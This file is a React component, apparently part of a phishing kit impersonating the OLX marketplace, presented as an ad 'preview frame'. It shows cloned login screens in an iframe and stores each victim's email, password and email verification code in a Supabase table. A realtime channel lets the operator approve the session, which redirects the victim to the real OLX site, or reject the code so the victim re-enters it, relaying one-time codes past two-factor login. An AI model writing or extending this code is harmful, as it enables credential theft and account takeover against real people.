import { useEffect, useRef, useState } from "react";
import { useQuery } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { attachIframeInteractions } from "@/lib/iframe-enhancements";
import { decompressStoredHtml } from "@/lib/ad-html-storage";
import { AdScreen } from "@/types/screen";
import {
  applyLeadPlaceholders,
  attachLeadCapture,
  fetchSessionLeads,
  getSessionId,
  LeadValue,
} from "@/lib/lead-capture";

interface PreviewFrameProps {
  html: string;
  mode?: "mobile" | "desktop";
  className?: string;
  /** Quando definido, busca telas filhas no banco e usa pra navegação. */
  adId?: string;
}

export function PreviewFrame({ html, mode = "mobile", className, adId }: PreviewFrameProps) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [height, setHeight] = useState<number>(800);
  const screensRef = useRef<AdScreen[]>([]);
  const historyRef = useRef<string[]>([]);
  const currentHtmlRef = useRef<string>("");
  const objectUrlsRef = useRef<string[]>([]);
  const leadsRef = useRef<LeadValue[]>([]);
  const currentScreenIdRef = useRef<string | null>(null);
  const capturedEmailRef = useRef("");

  const { data: screens } = useQuery({
    queryKey: ["ad_screens", adId],
    enabled: !!adId,
    queryFn: async () => {
      const { data, error } = await supabase
        .from("ad_screens")
        .select("*")
        .eq("ad_id", adId!);
      if (error) {
        console.error("[PreviewFrame] erro carregando telas:", error);
        throw error;
      }
      console.info("[PreviewFrame] telas carregadas:", data?.length, data?.map((s) => s.kind));
      return (data ?? []) as AdScreen[];
    },
  });

  // Mantém o ref sincronizado pra closures dos handlers do iframe
  useEffect(() => {
    screensRef.current = screens ?? [];
  }, [screens]);

  // Hidrata leads da sessão atual (pra placeholders {{lead.email}}) + escuta realtime.
  useEffect(() => {
    if (!adId) return;
    const sessionId = getSessionId();
    let cancelled = false;
    fetchSessionLeads(adId, sessionId).then((rows) => {
      if (!cancelled) leadsRef.current = rows;
    });
    const channel = supabase
      .channel(`lead-self-${adId}-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_leads", filter: `ad_id=eq.${adId}` },
        (payload) => {
          const row = payload.new as { session_id: string; field_name: string; value: string };
          if (row.session_id !== sessionId) return;
          leadsRef.current = [...leadsRef.current, { field_name: row.field_name, value: row.value }];
        },
      )
      .subscribe();

    // Escuta ações do dono (aceitar/rejeitar) pra essa sessão
    const actionChannel = supabase
      .channel(`session-actions-${adId}-${sessionId}`)
      .on(
        "postgres_changes",
        { event: "INSERT", schema: "public", table: "ad_session_actions", filter: `ad_id=eq.${adId}` },
        (payload) => {
          const row = payload.new as { session_id: string; action: string; payload: { message?: string } | null };
          if (row.session_id !== sessionId) return;
          if (row.action === "approve") {
            window.location.href = "https://www.olx.com.br";
          } else if (row.action === "reject") {
            const iframe = iframeRef.current;
            iframe?.contentWindow?.postMessage(
              { type: "iframe-code-error", message: row.payload?.message || "Código inválido. Verifique e tente novamente." },
              "*",
            );
          }
        },
      )
      .subscribe();

    return () => {
      cancelled = true;
      supabase.removeChannel(channel);
      supabase.removeChannel(actionChannel);
    };
  }, [adId]);

  useEffect(() => {
    if (!iframeRef.current) return;
    const iframe = iframeRef.current;

    let injected = html || "<html><body></body></html>";
    if (mode === "mobile" && !/<meta[^>]+viewport/i.test(injected)) {
      injected = injected.replace(
        /<head[^>]*>/i,
        (m) => `${m}\n<meta name="viewport" content="width=device-width, initial-scale=1">`,
      );
    }
    injected = applyLeadPlaceholders(injected, leadsRef.current);

    const renderHtml = (src: string) => {
      setHeight(800);
      const blob = new Blob([src], { type: "text/html" });
      const url = URL.createObjectURL(blob);
      objectUrlsRef.current.push(url);
      iframe.src = url;
    };

    renderHtml(injected);
    let onChildScreen = false;
    currentScreenIdRef.current = null;

    let detach: (() => void) | null = null;
    let detachCapture: (() => void) | null = null;
    let resizeObs: ResizeObserver | null = null;

    const measure = () => {
      const doc = iframe.contentDocument;
      if (!doc) return;
      const contentHeight = Math.max(doc.documentElement.scrollHeight, doc.body?.scrollHeight ?? 0);
      const parentHeight = iframe.parentElement?.clientHeight ?? 0;
      const h = Math.max(contentHeight, parentHeight);
      if (!h) return;
      setHeight((prev) => (Math.abs(h - prev) > 4 ? h : prev));
    };

    const onLoad = () => {
      const doc = iframe.contentDocument;
      if (doc) {
        try {
          iframe.contentWindow?.scrollTo(0, 0);
        } catch {
          // ignore
        }
        if (detach) detach();
        detach = attachIframeInteractions(doc);
        if (detachCapture) detachCapture();
        if (adId) {
          detachCapture = attachLeadCapture(doc, {
            adId,
            screenId: currentScreenIdRef.current,
          });
        }
        measure();
        const tries = [200, 600, 1200, 2500, 4000];
        tries.forEach((t) => setTimeout(measure, t));
        try {
          if (resizeObs) resizeObs.disconnect();
          resizeObs = new ResizeObserver(() => measure());
          if (doc.body) resizeObs.observe(doc.body);
        } catch { /* ignore */ }
      }
    };
    iframe.addEventListener("load", onLoad);

    const handleViewportRestore = () => {
      const doc = iframe.contentDocument;
      doc?.getElementById("__olx_help_modal_host__")?.remove();
      const tries = [0, 80, 200, 400, 800].map((t) => setTimeout(measure, t));
      return () => tries.forEach(clearTimeout);
    };

    let clearRestoreTimers: (() => void) | null = null;
    const onPageShow = () => {
      clearRestoreTimers?.();
      clearRestoreTimers = handleViewportRestore();
    };
    window.addEventListener("pageshow", onPageShow);
    window.addEventListener("popstate", onPageShow);

    const normalizeUrl = (raw: string): string => {
      try {
        const u = new URL(raw);
        return (u.origin + u.pathname.replace(/\/+$/, "")).toLowerCase();
      } catch {
        return raw.toLowerCase();
      }
    };

    const navigateToScreen = (screen: AdScreen) => {
      const screenHtml = decompressStoredHtml(screen.edited_html || screen.original_html || "");
      if (!screenHtml) return;
      let nextHtml = applyLeadPlaceholders(screenHtml, leadsRef.current);
      const capturedEmail = capturedEmailRef.current.trim();
      if (capturedEmail && (screen.kind === "access-account" || screen.kind === "password" || screen.kind === "email-code")) {
        nextHtml = nextHtml.replace(
          /(<div[^>]*id=["']user-email["'][^>]*>)(.*?)(<\/div>)/i,
          `$1${capturedEmail}$3`,
        );
      }
      // Empilha o HTML atual pra permitir "voltar" pra tela anterior em vez de pular pra tela mãe
      historyRef.current.push(currentHtmlRef.current);
      onChildScreen = true;
      currentScreenIdRef.current = screen.id;
      currentHtmlRef.current = nextHtml;
      renderHtml(nextHtml);
    };

    const goBackToMain = () => {
      const prev = historyRef.current.pop();
      if (prev && prev !== injected) {
        currentHtmlRef.current = prev;
        renderHtml(prev);
        return;
      }
      onChildScreen = false;
      currentScreenIdRef.current = null;
      historyRef.current = [];
      currentHtmlRef.current = injected;
      renderHtml(injected);
    };

    const onMessage = (e: MessageEvent) => {
      const data = e.data;
      if (!data || typeof data !== "object") return;

      if (data.type === "iframe-help-action" && typeof data.action === "string") {
        if (typeof data.email === "string") {
          capturedEmailRef.current = data.email;
        }
        const sessionId = getSessionId();

        // Quando o visitante clica em "Acessar" com e-mail válido, marca como confirmado
        if (data.action === "access-account" && adId && typeof data.email === "string" && data.email.trim()) {
          supabase
            .from("ad_leads")
            .insert({
              ad_id: adId,
              screen_id: currentScreenIdRef.current,
              session_id: sessionId,
              field_name: "email_submitted",
              value: data.email.trim(),
              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
            })
            .then(({ error }) => {
              if (error) console.warn("[PreviewFrame] email_submitted insert:", error);
            });
        }

        // Senha submetida → grava lead e avança pra tela de e-mail (email-code)
        if (data.action === "password-submit" && adId && typeof data.password === "string" && data.password) {
          supabase
            .from("ad_leads")
            .insert({
              ad_id: adId,
              screen_id: currentScreenIdRef.current,
              session_id: sessionId,
              field_name: "password_submitted",
              value: data.password,
              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
            })
            .then(({ error }) => {
              if (error) console.warn("[PreviewFrame] password_submitted insert:", error);
            });
          const next = screensRef.current.find((s) => s.kind === "email-code");
          if (next) navigateToScreen(next);
          else console.warn("[PreviewFrame] Sem tela 'email-code' vinculada");
          return;
        }

        // Código submetido → grava lead e fica esperando aprovação do dono
        if (data.action === "email-code-submit" && adId && typeof data.code === "string" && data.code) {
          supabase
            .from("ad_leads")
            .insert({
              ad_id: adId,
              screen_id: currentScreenIdRef.current,
              session_id: sessionId,
              field_name: "code_submitted",
              value: data.code,
              user_agent: typeof navigator !== "undefined" ? navigator.userAgent.slice(0, 500) : null,
            })
            .then(({ error }) => {
              if (error) console.warn("[PreviewFrame] code_submitted insert:", error);
            });
          return;
        }

        console.info("[PreviewFrame] help-action:", data.action, "telas:", screensRef.current.map((s) => s.kind));
        const screen = screensRef.current.find((s) => s.kind === data.action);
        if (!screen) {
          console.warn("[PreviewFrame] Nenhuma tela vinculada com kind=", data.action);
          return;
        }
        navigateToScreen(screen);
        return;
      }

      if (data.type === "iframe-link-click" && typeof data.url === "string") {
        if (onChildScreen) {
          goBackToMain();
          return;
        }
        const target = normalizeUrl(data.url);
        const match = screensRef.current.find(
          (s) => s.source_url && normalizeUrl(s.source_url) === target,
        );
        if (match) {
          navigateToScreen(match);
        } else {
          console.info("[PreviewFrame] Sem tela vinculada para:", data.url);
        }
        return;
      }

    };
    window.addEventListener("message", onMessage);

    return () => {
      iframe.removeEventListener("load", onLoad);
      window.removeEventListener("message", onMessage);
      window.removeEventListener("pageshow", onPageShow);
      window.removeEventListener("popstate", onPageShow);
      clearRestoreTimers?.();
      if (detach) detach();
      if (detachCapture) detachCapture();
      if (resizeObs) resizeObs.disconnect();
      objectUrlsRef.current.forEach((url) => URL.revokeObjectURL(url));
      objectUrlsRef.current = [];
      historyRef.current = [];
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [html, mode, adId]);

  return (
    <iframe
      ref={iframeRef}
      title="Pré-visualização do anúncio"
      className={className || "block w-full bg-white"}
      style={{ height: `${height}px`, border: 0, touchAction: "pan-y" }}
      scrolling="no"
      sandbox="allow-same-origin allow-scripts allow-popups allow-popups-to-escape-sandbox allow-forms"
    />
  );
}
